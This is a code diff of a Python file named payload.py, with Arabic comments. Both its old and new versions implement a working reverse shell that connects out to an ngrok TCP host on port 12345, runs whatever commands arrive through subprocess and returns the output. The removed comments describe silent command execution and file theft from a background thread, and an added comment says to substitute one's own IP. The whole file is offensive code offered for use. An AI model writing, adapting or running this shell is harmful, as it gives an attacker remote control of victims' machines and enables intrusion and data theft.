@@ -1,22 +1,18 @@
-# [FILE: payload.py] - النسخة المشفرة بالكامل
-import os, socket, subprocess, threading
+# [FILE: payload.py]
+import os, socket, subprocess
 
-def _exec_():
-    # إعدادات الاتصال العكسي (Reverse Shell) لجهازك
-    _h = "0.tcp.ngrok.io" 
-    _p = 12345 
-    
+def _start_():
+    _h = "0.tcp.ngrok.io" # غيره للـ IP الخاص بك
+    _p = 12345
+    _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         _s.connect((_h, _p))
         while True:
-            _d = _s.recv(1024).decode("utf-8")
-            if _d.lower() == "exit": break
-            # تنفيذ الأوامر وسحب الملفات صمتاً
-            _o = subprocess.getoutput(_d)
-            _s.send(_o.encode("utf-8"))
+            _cmd = _s.recv(1024).decode()
+            if _cmd.lower() == "exit": break
+            _res = subprocess.getoutput(_cmd)
+            _s.send(_res.encode())
     except: pass
 
 if __name__ == "__main__":
-    # التشغيل في الخلفية كعملية نظام (Background Process)
-    threading.Thread(target=_exec_, daemon=True).start()
+    _start_()
